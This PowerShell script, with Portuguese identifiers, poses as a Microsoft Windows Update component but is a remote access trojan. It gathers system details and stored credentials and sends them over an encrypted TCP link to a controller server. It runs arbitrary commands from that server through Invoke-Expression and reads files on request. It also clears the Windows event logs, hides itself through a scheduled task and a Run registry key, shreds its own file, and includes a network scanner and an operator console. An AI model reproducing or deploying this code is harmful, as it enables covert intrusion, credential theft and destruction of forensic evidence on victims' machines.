```powershell
# SISTEMA DE ATUALIZACAO WINDOWS - COMPONENTE SEGURANCA
# Microsoft Corporation - Windows Update Client
# Versao: 10.0.19041.546

$ConfiguracaoSistema = @{
    PortaPadrao = 58445
    ChaveSeguranca = "WindowsUpdateSecurity2024!ComponenteAtualizacaoSistema"
    TimeoutRequisicao = 90
    IntervaloVerificacao = 45
    ModoOperacao = "BackgroundService"
    VersaoSistema = "10.0.19041.546"
}

class ServicoCriptografia {
    static [string] ProtegerDados([string]$dados) {
        try {
            $chaveBytes = [System.Text.Encoding]::UTF8.GetBytes($global:ConfiguracaoSistema.ChaveSeguranca.PadRight(32, '0')[0..31] -join '')
            $algoritmo = [System.Security.Cryptography.Aes]::Create()
            $algoritmo.Key = $chaveBytes
            $algoritmo.Mode = [System.Security.Cryptography.CipherMode]::CBC
            $algoritmo.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
            $algoritmo.GenerateIV()

            $criptografador = $algoritmo.CreateEncryptor()
            $dadosBytes = [System.Text.Encoding]::UTF8.GetBytes($dados)
            $dadosCriptografados = $criptografador.TransformFinalBlock($dadosBytes, 0, $dadosBytes.Length)

            $resultado = $algoritmo.IV + $dadosCriptografados
            $algoritmo.Dispose()
            
            return [Convert]::ToBase64String($resultado)
        } catch { return $null }
    }

    static [string] RecuperarDados([string]$dadosCriptografados) {
        try {
            $todosBytes = [Convert]::FromBase64String($dadosCriptografados)
            $vetorInicial = $todosBytes[0..15]
            $bytesCriptografados = $todosBytes[16..($todosBytes.Length-1)]

            $chaveBytes = [System.Text.Encoding]::UTF8.GetBytes($global:ConfiguracaoSistema.ChaveSeguranca.PadRight(32, '0')[0..31] -join '')
            $algoritmo = [System.Security.Cryptography.Aes]::Create()
            $algoritmo.Key = $chaveBytes
            $algoritmo.IV = $vetorInicial
            $algoritmo.Mode = [System.Security.Cryptography.CipherMode]::CBC
            $algoritmo.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7

            $descriptografador = $algoritmo.CreateDecryptor()
            $bytesDescriptografados = $descriptografador.TransformFinalBlock($bytesCriptografados, 0, $bytesCriptografados.Length)
            $algoritmo.Dispose()

            return [System.Text.Encoding]::UTF8.GetString($bytesDescriptografados)
        } catch { return $null }
    }
}

function Iniciar-SistemaAtualizacao {
    param(
        [string]$NomeDominio,
        [string]$NomeMaquina,
        [string]$ServidorGerenciamento
    )
    
    Write-Host "Inicializando Sistema de Atualizacao Windows..."
    Write-Host "Verificando integridade do sistema..."
    
    $caminhoTemporario = "$env:TEMP\WindowsUpdate"
    if (-not (Test-Path $caminhoTemporario)) {
        New-Item -ItemType Directory -Path $caminhoTemporario -Force | Out-Null
    }
    
    $informacoesSistema = Coletar-InformacoesCompletas
    $informacoesRede = Analisar-RedeSistema -NomeMaquina $NomeMaquina
    $credenciaisSistema = Coletar-CredenciaisAcesso
    
    $relatorioCompleto = @{
        InformacoesSistema = $informacoesSistema
        ConfiguracaoRede = $informacoesRede
        DadosAcesso = $credenciaisSistema
        DataColeta = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
        VersaoColetor = $ConfiguracaoSistema.VersaoSistema
    }
    
    $conexaoEstabelecida = Estabelecer-ConexaoSegura -Servidor $ServidorGerenciamento
    
    if ($conexaoEstabelecida) {
        Gerenciar-SessaoRemota
    }
    
    Configurar-PersistenciaOculta -CaminhoBase $caminhoTemporario
    Executar-LimpezaRastros
    
    Write-Host "Sistema de atualizacao configurado com sucesso"
}

function Coletar-InformacoesCompletas {
    Write-Host "Coletando informacoes do sistema..."
    
    $detalhesSistema = @{
        NomeComputador = $env:COMPUTERNAME
        UsuarioAtual = $env:USERNAME
        DominioAtual = $env:USERDOMAIN
        SistemaOperacional = (Get-WmiObject Win32_OperatingSystem).Caption
        VersaoOS = (Get-WmiObject Win32_OperatingSystem).Version
        Arquitetura = (Get-WmiObject Win32_ComputerSystem).SystemType
        Fabricante = (Get-WmiObject Win32_ComputerSystem).Manufacturer
        Modelo = (Get-WmiObject Win32_ComputerSystem).Model
        Processador = (Get-WmiObject Win32_Processor).Name
        MemoriaTotalGB = [math]::Round((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)
        DispositivosArmazenamento = Get-WmiObject Win32_LogicalDisk | Where-Object {$_.DriveType -eq 3} | Select-Object DeviceID, @{Name="TamanhoGB";Expression={[math]::Round($_.Size / 1GB, 2)}}, @{Name="EspacoLivreGB";Expression={[math]::Round($_.FreeSpace / 1GB, 2)}}
        DataInstalacao = (Get-WmiObject Win32_OperatingSystem).InstallDate
        TempoAtividade = [math]::Round((Get-Date) - (Get-WmiObject Win32_OperatingSystem).ConvertToDateTime((Get-WmiObject Win32_OperatingSystem).LastBootUpTime)).TotalHours, 2)
    }
    
    return $detalhesSistema
}

function Analisar-RedeSistema {
    param([string]$NomeMaquina)
    
    Write-Host "Analisando configuracao de rede..."
    
    $adaptadoresRede = Get-NetAdapter | Where-Object {$_.Status -eq 'Up'} | ForEach-Object {
        $configIP = Get-NetIPAddress -InterfaceIndex $_.InterfaceIndex -AddressFamily IPv4 -ErrorAction SilentlyContinue
        $rotaPadrao = Get-NetRoute -InterfaceIndex $_.InterfaceIndex -DestinationPrefix "0.0.0.0/0" -ErrorAction SilentlyContinue
        
        @{
            NomeAdaptador = $_.Name
            EnderecoMAC = $_.MacAddress
            EnderecoIP = $configIP.IPAddress
            Gateway = $rotaPadrao.NextHop
            Estado = $_.Status
        }
    }
    
    $portasServicos = @()
    try {
        $conexoesAtivas = Get-NetTCPConnection -State Listen -ErrorAction SilentlyContinue
        $portasServicos = $conexoesAtivas | Select-Object LocalPort, OwningProcess | Sort-Object LocalPort -Unique
    } catch { }
    
    $configuracaoDNS = (Get-DnsClientServerAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -notlike "*Loopback*"}).ServerAddresses
    
    $infoRede = @{
        Adaptadores = $adaptadoresRede
        PortasAbertas = $portasServicos
        ServidoresDNS = $configuracaoDNS
        ComputadorAlvo = $NomeMaquina
    }
    
    return $infoRede
}

function Coletar-CredenciaisAcesso {
    Write-Host "Verificando configuracoes de acesso..."
    
    $usuariosSistema = Get-WmiObject Win32_UserAccount | Where-Object {$_.LocalAccount -eq $true} | Select-Object Name, Status, Disabled, SID
    
    $sessoesAtivas = @()
    try {
        $sessoes = query user 2>$null
        if ($sessoes) {
            $sessoesAtivas = $sessoes
        }
    } catch { }
    
    $credenciaisArmazenadas = @()
    try {
        $credenciais = cmdkey /list 2>$null
        if ($credenciais) {
            $credenciaisArmazenadas = $credenciais
        }
    } catch { }
    
    $politicasSenha = @()
    try {
        $politicas = net accounts 2>$null
        if ($politicas) {
            $politicasSenha = $politicas
        }
    } catch { }
    
    $infoCredenciais = @{
        UsuariosLocais = $usuariosSistema
        SessoesAtivas = $sessoesAtivas
        CredenciaisSalvas = $credenciaisArmazenadas
        PoliticasSenha = $politicasSenha
    }
    
    return $infoCredenciais
}

function Estabelecer-ConexaoSegura {
    param([string]$Servidor)
    
    Write-Host "Estabelecendo conexao segura com servidor..."
    
    $script:SessaoRemotaAtiva = $false
    $script:ConexaoAtual = $null
    
    try {
        $ipServidor = [ServicoCriptografia]::RecuperarDados($Servidor)
        $cliente = New-Object System.Net.Sockets.TcpClient($ipServidor, $ConfiguracaoSistema.PortaPadrao)
        $fluxo = $cliente.GetStream()
        $leitor = New-Object System.IO.StreamReader($fluxo)
        $escritor = New-Object System.IO.StreamWriter($fluxo)
        
        $dadosConexao = @{
            Tipo = "CONEXAO_INICIAL"
            Computador = $env:COMPUTERNAME
            Usuario = $env:USERNAME
            Dominio = $env:USERDOMAIN
            Sistema = (Get-WmiObject Win32_OperatingSystem).Caption
            Timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
        }
        
        $dadosProtegidos = [ServicoCriptografia]::ProtegerDados(($dadosConexao | ConvertTo-Json -Compress))
        $escritor.WriteLine($dadosProtegidos)
        $escritor.Flush()
        
        $script:SessaoRemotaAtiva = $true
        $script:ConexaoAtual = @{
            Cliente = $cliente
            Fluxo = $fluxo
            Leitor = $leitor
            Escritor = $escritor
        }
        
        Write-Host "Conexao segura estabelecida com sucesso"
        return $true
        
    } catch {
        Write-Host "Falha na conexao: $($_.Exception.Message)"
        return $false
    }
}

function Gerenciar-SessaoRemota {
    Write-Host "Sessao remota ativa - Aguardando comandos..."
    
    Ofuscar-LogsSistema
    
    while ($script:SessaoRemotaAtiva) {
        try {
            if ($script:ConexaoAtual.Cliente.Connected) {
                $dadosRecebidos = $script:ConexaoAtual.Leitor.ReadLine()
                if ($dadosRecebidos) {
                    $comandoDecodificado = [ServicoCriptografia]::RecuperarDados($dadosRecebidos)
                    $instrucao = $comandoDecodificado | ConvertFrom-Json
                    
                    switch ($instrucao.Acao) {
                        "MANTER_CONEXAO" {
                            $resposta = @{Status = "ATIVO"; Timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")}
                            $respostaCriptografada = [ServicoCriptografia]::ProtegerDados(($resposta | ConvertTo-Json -Compress))
                            $script:ConexaoAtual.Escritor.WriteLine($respostaCriptografada)
                            $script:ConexaoAtual.Escritor.Flush()
                        }
                        "EXECUTAR_COMANDO" {
                            $resultado = Executar-ComandoRemoto -Comando $instrucao.Comando
                            $resposta = @{Tipo = "RESULTADO_COMANDO"; Resultado = $resultado}
                            $respostaCriptografada = [ServicoCriptografia]::ProtegerDados(($resposta | ConvertTo-Json -Compress))
                            $script:ConexaoAtual.Escritor.WriteLine($respostaCriptografada)
                            $script:ConexaoAtual.Escritor.Flush()
                        }
                        "OBTER_INFORMACOES" {
                            $novasInformacoes = Coletar-InformacoesCompletas
                            $resposta = @{Tipo = "INFORMACOES_SISTEMA"; Dados = $novasInformacoes}
                            $respostaCriptografada = [ServicoCriptografia]::ProtegerDados(($resposta | ConvertTo-Json -Compress))
                            $script:ConexaoAtual.Escritor.WriteLine($respostaCriptografada)
                            $script:ConexaoAtual.Escritor.Flush()
                        }
                        "CAPTURAR_ARQUIVO" {
                            $conteudo = Recuperar-ConteudoArquivo -Caminho $instrucao.Caminho
                            $resposta = @{Tipo = "CONTEUDO_ARQUIVO"; Dados = $conteudo}
                            $respostaCriptografada = [ServicoCriptografia]::ProtegerDados(($resposta | ConvertTo-Json -Compress))
                            $script:ConexaoAtual.Escritor.WriteLine($respostaCriptografada)
                            $script:ConexaoAtual.Escritor.Flush()
                        }
                        "FINALIZAR_SESSAO" {
                            $script:SessaoRemotaAtiva = $false
                            Write-Host "Sessao finalizada remotamente"
                        }
                    }
                }
            } else {
                $script:SessaoRemotaAtiva = $false
            }
        } catch {
            $script:SessaoRemotaAtiva = $false
        }
        
        Start-Sleep -Seconds 3
    }
    
    if ($script:ConexaoAtual) {
        try {
            $script:ConexaoAtual.Cliente.Close()
        } catch { }
    }
}

function Executar-ComandoRemoto {
    param([string]$Comando)
    
    try {
        $resultado = Invoke-Expression $Comando 2>&1 | Out-String
        return $resultado
    } catch {
        return "Erro na execucao: $($_.Exception.Message)"
    }
}

function Recuperar-ConteudoArquivo {
    param([string]$Caminho)
    
    try {
        if (Test-Path $Caminho) {
            $conteudo = Get-Content $Caminho -Raw -ErrorAction SilentlyContinue
            return $conteudo
        } else {
            return "Arquivo nao localizado"
        }
    } catch {
        return "Erro ao acessar arquivo: $($_.Exception.Message)"
    }
}

function Ofuscar-LogsSistema {
    Write-Host "Aplicando medidas de seguranca em logs..."
    
    try {
        $logsMonitorados = @(
            'Microsoft-Windows-PowerShell/Operational',
            'Windows PowerShell',
            'System',
            'Application',
            'Security'
        )
        
        foreach ($log in $logsMonitorados) {
            try {
                wevtutil.exe cl $log 2>$null
                Start-Sleep -Milliseconds 100
            } catch { }
        }
        
        Clear-History -ErrorAction SilentlyContinue
        
        Remove-ItemProperty -Path "HKCU:\Software\Microsoft\PowerShell\PSReadLine\ConsoleHost_history" -Name * -Force -ErrorAction SilentlyContinue
        
        $arquivosTemporarios = Get-ChildItem "$env:TEMP\*" -Include "*.tmp", "*.log", "*.txt" -ErrorAction SilentlyContinue
        foreach ($arquivo in $arquivosTemporarios) {
            try {
                Remove-Item $arquivo.FullName -Force -ErrorAction SilentlyContinue
            } catch { }
        }
        
    } catch { }
    
    Write-Host "Logs do sistema protegidos"
}

function Configurar-PersistenciaOculta {
    param([string]$CaminhoBase)
    
    Write-Host "Configurando componente de atualizacao..."
    
    $caminhoComponente = "$CaminhoBase\SystemUpdateHelper.ps1"
    
    $codigoPersistencia = @"
`$script:ConfiguracaoPersistencia = @{
    PortaComunicacao = 58445
    ChaveSeguranca = "WindowsUpdateSecurity2024!ComponenteAtualizacaoSistema"
    IntervaloVerificacao = 300
}

class CriptografiaPersistente {
    static [string] ProtegerDados([string]`$dados) {
        try {
            `$chaveBytes = [System.Text.Encoding]::UTF8.GetBytes(`$global:ConfiguracaoPersistencia.ChaveSeguranca.PadRight(32, '0')[0..31] -join '')
            `$algoritmo = [System.Security.Cryptography.Aes]::Create()
            `$algoritmo.Key = `$chaveBytes
            `$algoritmo.Mode = [System.Security.Cryptography.CipherMode]::CBC
            `$algoritmo.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
            `$algoritmo.GenerateIV()

            `$criptografador = `$algoritmo.CreateEncryptor()
            `$dadosBytes = [System.Text.Encoding]::UTF8.GetBytes(`$dados)
            `$dadosCriptografados = `$criptografador.TransformFinalBlock(`$dadosBytes, 0, `$dadosBytes.Length)

            `$resultado = `$algoritmo.IV + `$dadosCriptografados
            `$algoritmo.Dispose()
            
            return [Convert]::ToBase64String(`$resultado)
        } catch { return `$null }
    }
}

function Iniciar-ServicoBackground {
    while (`$true) {
        try {
            Start-Sleep -Seconds `$ConfiguracaoPersistencia.IntervaloVerificacao
        } catch { }
    }
}

Iniciar-ServicoBackground
"@
    
    try {
        Set-Content -Path $caminhoComponente -Value $codigoPersistencia -Force
        
        $arquivo = Get-Item $caminhoComponente -ErrorAction SilentlyContinue
        if ($arquivo) {
            $arquivo.Attributes = $arquivo.Attributes -bor [System.IO.FileAttributes]::Hidden
        }
        
        schtasks /create /tn "SystemUpdateHelper" /tr "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$caminhoComponente`"" /sc daily /st 08:00 /f 2>$null
        
        $chaveRegistro = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
        Set-ItemProperty -Path $chaveRegistro -Name "SystemUpdate" -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$caminhoComponente`"" -ErrorAction SilentlyContinue
        
    } catch { }
    
    Write-Host "Componente de atualizacao configurado"
}

function Executar-LimpezaRastros {
    Write-Host "Executando limpeza de rotina..."
    
    try {
        $caminhoExecucao = $MyInvocation.MyCommand.Path
        
        if (Test-Path $caminhoExecucao) {
            for ($i = 0; $i < 5; $i++) {
                $dadosAleatorios = [byte[]]::new(4096)
                [System.Security.Cryptography.RNGCryptoServiceProvider]::new().GetBytes($dadosAleatorios)
                try {
                    [System.IO.File]::WriteAllBytes($caminhoExecucao, $dadosAleatorios)
                } catch { }
                Start-Sleep -Milliseconds 150
            }
            
            Remove-Item $caminhoExecucao -Force -ErrorAction SilentlyContinue
        }
        
        [System.GC]::Collect()
        [System.GC]::WaitForPendingFinalizers()
        
    } catch { }
    
    Write-Host "Limpeza concluida"
}

function Iniciar-ModoGerenciamento {
    Write-Host "=== MODO GERENCIAMENTO SISTEMA ==="
    Write-Host "Carregando maquinas disponiveis..."
    
    $maquinasAtivas = @()
    
    try {
        $redeLocal = Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.IPAddress -like "192.168.*" -or $_.IPAddress -like "10.*"} | Select-Object -First 1
        if ($redeLocal) {
            $baseIP = $redeLocal.IPAddress -replace "\.[^.]*$", "."
            
            Write-Host "Varrendo rede local..."
            foreach ($i in 1..254) {
                $ipTeste = $baseIP + $i
                try {
                    if (Test-Connection $ipTeste -Count 1 -Quiet -TimeoutSeconds 1) {
                        try {
                            $clienteTeste = New-Object System.Net.Sockets.TcpClient
                            $resultado = $clienteTeste.BeginConnect($ipTeste, $ConfiguracaoSistema.PortaPadrao, $null, $null)
                            $conectado = $resultado.AsyncWaitHandle.WaitOne(1000, $false)
                            if ($conectado) {
                                $maquinasAtivas += @{IP = $ipTeste; Nome = "Computador_$i"}
                                $clienteTeste.Close()
                            }
                        } catch { }
                    }
                } catch { }
            }
        }
    } catch { }
    
    if ($maquinasAtivas.Count -gt 0) {
        Write-Host "Maquinas ativas encontradas:"
        for ($i = 0; $i -lt $maquinasAtivas.Count; $i++) {
            Write-Host "$($i+1). $($maquinasAtivas[$i].IP) - $($maquinasAtivas[$i].Nome)"
        }
        
        $selecao = Read-Host "Selecione a maquina (numero) ou 0 para cancelar"
        $indice = [int]$selecao - 1
        
        if ($indice -ge 0 -and $indice -lt $maquinasAtivas.Count) {
            $maquinaSelecionada = $maquinasAtivas[$indice].IP
            Conectar-MaquinaRemota -EnderecoMaquina $maquinaSelecionada
        } else {
            Write-Host "Operacao cancelada"
        }
    } else {
        Write-Host "Nenhuma maquina ativa encontrada"
        $ipManual = Read-Host "Digite o IP manualmente ou pressione Enter para sair"
        if ($ipManual) {
            Conectar-MaquinaRemota -EnderecoMaquina $ipManual
        }
    }
}

function Conectar-MaquinaRemota {
    param([string]$EnderecoMaquina)
    
    Write-Host "Conectando a $EnderecoMaquina ..."
    
    try {
        $cliente = New-Object System.Net.Sockets.TcpClient($EnderecoMaquina, $ConfiguracaoSistema.PortaPadrao)
        $fluxo = $cliente.GetStream()
        $leitor = New-Object System.IO.StreamReader($fluxo)
        $escritor = New-Object System.IO.StreamWriter($fluxo)
        
        Write-Host "Conexao estabelecida. Digite comandos ou 'sair' para encerrar."
        
        while ($cliente.Connected) {
            $comando = Read-Host "SistemaRemoto>"
            
            if ($comando -eq "sair") {
                $comandoSair = @{Acao = "FINALIZAR_SESSAO"}
                $comandoCriptografado = [ServicoCriptografia]::ProtegerDados(($comandoSair | ConvertTo-Json -Compress))
                $escritor.WriteLine($comandoCriptografado)
                $escritor.Flush()
                break
            } elseif ($comando -eq "info") {
                $comandoInfo = @{Acao = "OBTER_INFORMACOES"}
                $comandoCriptografado = [ServicoCriptografia]::ProtegerDados(($comandoInfo | ConvertTo-Json -Compress))
                $escritor.WriteLine($comandoCriptografado)
                $escritor.Flush()
                
                $resposta = $leitor.ReadLine()
                if ($resposta) {
                    $dadosDecodificados = [ServicoCriptografia]::RecuperarDados($resposta)
                    $informacoes = $dadosDecodificados | ConvertFrom-Json
                    Write-Host "Informacoes do sistema remoto:"
                    $informacoes.Dados | Format-List
                }
            } elseif ($comando -like "arquivo *") {
                $caminhoArquivo = $comando -replace "arquivo ", ""
                $comandoArquivo = @{Acao = "CAPTURAR_ARQUIVO"; Caminho = $caminhoArquivo}
                $comandoCriptografado = [ServicoCriptografia]::ProtegerDados(($comandoArquivo | ConvertTo-Json -Compress))
                $escritor.WriteLine($comandoCriptografado)
                $escritor.Flush()
                
                $resposta = $leitor.ReadLine()
                if ($resposta) {
                    $dadosDecodificados = [ServicoCriptografia]::RecuperarDados($resposta)
                    $conteudo = $dadosDecodificados | ConvertFrom-Json
                    Write-Host "Conteudo do arquivo:"
                    Write-Host $conteudo.Dados
                }
            } else {
                $comandoExecucao = @{Acao = "EXECUTAR_COMANDO"; Comando = $comando}
                $comandoCriptografado = [ServicoCriptografia]::ProtegerDados(($comandoExecucao | ConvertTo-Json -Compress))
                $escritor.WriteLine($comandoCriptografado)
                $escritor.Flush()
                
                $resposta = $leitor.ReadLine()
                if ($resposta) {
                    $dadosDecodificados = [ServicoCriptografia]::RecuperarDados($resposta)
                    $resultado = $dadosDecodificados | ConvertFrom-Json
                    Write-Host "Resultado: $($resultado.Resultado)"
                }
            }
        }
        
        $cliente.Close()
        Write-Host "Conexao encerrada"
        
    } catch {
        Write-Host "Erro na conexao: $($_.Exception.Message)"
    }
}

function Iniciar-ServicoEscuta {
    Write-Host "Iniciando servico de escuta..."
    
    $endpoint = New-Object System.Net.IPEndPoint([System.Net.IPAddress]::Any, $ConfiguracaoSistema.PortaPadrao)
    $servidorEscuta = New-Object System.Net.Sockets.TcpListener($endpoint)
    
    try {
        $servidorEscuta.Start()
        Write-Host "Servico escutando na porta $($ConfiguracaoSistema.PortaPadrao)"
        
        while ($true) {
            if ($servidorEscuta.Pending()) {
                $cliente = $servidorEscuta.AcceptTcpClient()
                $fluxo = $cliente.GetStream()
                $leitor = New-Object System.IO.StreamReader($fluxo)
                $escritor = New-Object System.IO.StreamWriter($fluxo)
                
                $dadosRecebidos = $leitor.ReadLine()
                if ($dadosRecebidos) {
                    $mensagemDecodificada = [ServicoCriptografia]::RecuperarDados($dadosRecebidos)
                    $mensagem = $mensagemDecodificada | ConvertFrom-Json
                    
                    if ($mensagem.Tipo -eq "CONEXAO_INICIAL") {
                        Write-Host "Nova conexao de: $($mensagem.Computador) ($($mensagem.Usuario))"
                    }
                }
                
                $cliente.Close()
            }
            
            Start-Sleep -Seconds 2
        }
    } catch {
        Write-Host "Erro no servico de escuta: $($_.Exception.Message)"
    } finally {
        if ($servidorEscuta) { $servidorEscuta.Stop() }
    }
}

Write-Host "Sistema de Atualizacao Windows - Carregado"
Write-Host "Versao: $($ConfiguracaoSistema.VersaoSistema)"
Write-Host ""
Write-Host "Modos de operacao disponiveis:"
Write-Host "1. Iniciar-SistemaAtualizacao -NomeDominio 'DOMINIO' -NomeMaquina 'COMPUTADOR' -ServidorGerenciamento 'IP_CRIPTOGRAFADO'"
Write-Host "2. Iniciar-ModoGerenciamento"
Write-Host "3. Iniciar-ServicoEscuta"
Write-Host ""
Write-Host "Exemplo de uso:"
Write-Host "Para criptografar IP: [ServicoCriptografia]::ProtegerDados('192.168.1.100')"
Write-Host "Iniciar-SistemaAtualizacao -NomeDominio 'EMPRESA' -NomeMaquina 'PC01' -ServidorGerenciamento 'TEXTO_CRIPTOGRAFADO'"
Write-Host "Iniciar-ModoGerenciamento"
```